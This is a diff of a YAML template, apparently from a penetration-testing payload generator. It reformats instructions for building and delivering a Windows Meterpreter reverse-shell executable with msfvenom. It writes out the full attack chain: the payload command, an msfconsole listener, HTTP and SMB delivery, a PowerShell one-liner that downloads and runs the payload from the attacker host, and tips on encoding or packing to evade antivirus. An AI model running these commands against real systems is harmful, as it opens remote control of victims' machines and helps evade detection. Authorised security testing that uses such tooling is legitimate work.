@@ -52,34 +52,53 @@ preprocessing: []
 output:
   type: "command"
   command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f exe -o {{ output_path }}/{{ output_file }}"
+
   launch_instructions: |
-    Basic MSFVenom Payload - Launch Instructions
+    # Start Listener
+    ```bash
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    ```
 
-    Start Listener:
-    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    # Transfer and Execute
 
-    Transfer and Execute:
-    $ python3 -m http.server 80
-    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ## HTTP Method
+    **Attacker:**
+    ```bash
+    python3 -m http.server 8000
+    ```
 
-    Alternative (SMB):
-    $ impacket-smbserver share . -smb2support
-    $ copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
+    **Target:**
+    ```powershell
+    powershell -c "IWR -Uri http://{{ lhost }}:8000/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
+    ```
 
-    Notes:
-    - Staged payload: Requires network connectivity to {{ lhost }}:{{ lport }} to download full Meterpreter DLL
-    - EXITFUNC=thread ensures clean exit without crashing process
+    ## Alternative (SMB)
+    **Attacker:**
+    ```bash
+    impacket-smbserver share . -smb2support
+    ```
+
+    **Target:** 
+    ```cmd
+    copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
+    ```
+
+    # Notes
+    - **Staged payload**: Requires network connectivity to `{{ lhost }}:{{ lport }}` to download full Meterpreter DLL
+    - `EXITFUNC=thread` ensures clean exit without crashing process
     - Windows Defender and most AV will detect this immediately (unobfuscated msfvenom payload)
     - Consider encoding, packing, or custom loaders for real engagements
     - Session should appear in msfconsole: "Meterpreter session X opened"
 
-    Troubleshooting:
-    - No connection: Check firewall rules on attacker machine (allow {{ lport }}/tcp)
-    - Connection drops immediately: AV likely killed the process
-    - "Connection refused": Listener not running or wrong LHOST/LPORT
-    - Payload won't execute: Windows SmartScreen or AV blocking execution
+    # Troubleshooting
+    - **No connection**: Check firewall rules on attacker machine (allow `{{ lport }}/tcp`)
+    - **Connection drops immediately**: AV likely killed the process
+    - **"Connection refused"**: Listener not running or wrong LHOST/LPORT
+    - **Payload won't execute**: Windows SmartScreen or AV blocking execution
 
-    Cleanup:
-    On target:
-    $ taskkill /F /IM {{ output_file }} 2>nul
-    $ del {{ output_file }}
+    # Cleanup
+    **On target:**
+    ```cmd
+    taskkill /F /IM {{ output_file }} 2>nul
+    del {{ output_file }}
+    ```
